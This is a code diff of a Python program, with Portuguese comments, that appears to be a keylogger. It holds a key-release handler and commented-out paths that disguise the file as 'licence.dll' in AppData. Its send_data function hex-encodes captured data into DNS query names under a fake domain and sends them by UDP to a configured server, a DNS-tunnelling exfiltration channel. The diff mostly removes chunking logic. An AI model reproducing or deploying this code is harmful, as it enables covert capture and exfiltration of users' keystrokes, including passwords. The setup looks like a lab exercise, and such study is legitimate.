@@ -14,9 +14,8 @@ from dnslib import DNSRecord
 # _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
 # _NAME = 'licence.dll'
 
-# Futuramente podemos passar essas VARs global
-# Para dentro das funções, está aqui apenas para
-# facilitar as alterações
+# Futuramente podemos passar essas VARs global para dentro das funções
+# está aqui apenas para facilitar as alterações
 _DNS_ADDR = ('127.0.0.1', 9953)
 _FAKE_DOMAIN = '.fake-domain.com.'
 _KEYS = []
@@ -94,32 +93,21 @@ def send_data(data):
     '''
     global _DNS_ADDR, _FAKE_DOMAIN
 
-    # Remove entradas None da lista - Unico metodo ate agora que funcionou para nao crashar
-    # data = [entry for entry in data if entry is not None]
+    payload = ''.join([hex(ord(c)) for c in data]) # ord() no c
+    payload = payload.replace('0x', '')
+    request = str(payload) + str(_FAKE_DOMAIN)
+    
+    # Cria a requisição DNS
+    domain = DNSRecord.question(request)
 
-    # Divide os dados em partes menores para serem válidos
-    # como nomes de domínio máximo de 63bytes por hostname.
-    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
-    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 
-
-    while len(parts) > 0:
-        # Cria o payload com o nome de domínio fictício
-        payload = parts.pop(0)
-        payload = ''.join([hex(ord(c)) for c in payload]) # ord() no c
-        payload = payload.replace('0x', '')
-        request = str(payload) + str(_FAKE_DOMAIN)
-        
-        # Cria a requisição DNS
-        domain = DNSRecord.question(request)
-
-        # Envia a requisição DNS para o servidor
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(3.0)
-            sock.sendto(domain.pack(), _DNS_ADDR)
-            _ = sock.recvfrom(512)
-        except:
-            pass
+    # Envia a requisição DNS para o servidor
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3.0)
+        sock.sendto(domain.pack(), _DNS_ADDR)
+        _ = sock.recvfrom(512)
+    except:
+        pass
 
 def on_release(key):
     global _KEYS, _USR_HAS
